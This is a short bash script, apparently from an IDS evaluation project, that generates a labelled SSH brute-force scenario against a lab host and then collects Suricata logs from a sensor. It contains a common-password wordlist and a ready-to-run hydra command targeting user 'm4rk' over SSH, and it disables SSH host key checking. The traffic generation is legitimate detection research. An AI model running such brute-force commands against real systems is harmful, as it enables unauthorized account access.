#!/usr/bin/env bash
set -euo pipefail

FECHA="$(date +%Y%m%d)"
GRUPO="anom"
ESCENARIO="bruteforce"
CORRIDA="01"
ORIGEN="192.168.0.100"
DESTINO="192.168.0.120"
HERRAMIENTA="hydra"
DURACION_SEGUNDOS=300
SENSOR="192.168.0.110"
PROJECT_ROOT_SENSOR="/home/m4rk/ppi-surikata-producto"
EXPORT_SCRIPT="${PROJECT_ROOT_SENSOR}/scripts/capture/exportar_eve_por_escenario.sh"
BITACORA_SCRIPT="${PROJECT_ROOT_SENSOR}/scripts/evaluation/registrar_bitacora.sh"
ARCHIVO_SALIDA="${FECHA}_${GRUPO}_${ESCENARIO}_${CORRIDA}_eve.json"

HORA_INICIO="$(date +%T)"
echo "Iniciando B6 SSH brute force → ${DESTINO}:22 por ${DURACION_SEGUNDOS}s"

# Lista de contraseñas comunes (deliberadamente sin la real para que no comprometa)
cat > /tmp/pass_bf_b6.txt << 'PASSLIST'
password
123456
admin
letmein
qwerty
test
guest
master
monkey
football
welcome
hello
dragon
superman
batman
iloveyou
trustno1
sunshine
princess
shadow
abc123
000000
passw0rd
login
root
toor
PASSLIST

timeout "$DURACION_SEGUNDOS" hydra \
  -l m4rk \
  -P /tmp/pass_bf_b6.txt \
  -t 4 \
  -f \
  -o /tmp/hydra_b6_resultado.txt \
  "$DESTINO" ssh 2>/dev/null || true

rm -f /tmp/pass_bf_b6.txt

HORA_FIN="$(date +%T)"

ssh -o StrictHostKeyChecking=no m4rk@"$SENSOR" \
  "bash ${EXPORT_SCRIPT} ${FECHA} ${GRUPO} ${ESCENARIO} ${CORRIDA}"
ssh -o StrictHostKeyChecking=no m4rk@"$SENSOR" \
  "bash ${BITACORA_SCRIPT} ${GRUPO} ${ESCENARIO} ${ORIGEN} ${DESTINO} ${HORA_INICIO} ${HORA_FIN} ${HERRAMIENTA} ${ARCHIVO_SALIDA}"

echo "B6 completado | Inicio: $HORA_INICIO | Fin: $HORA_FIN | Archivo: $ARCHIVO_SALIDA"
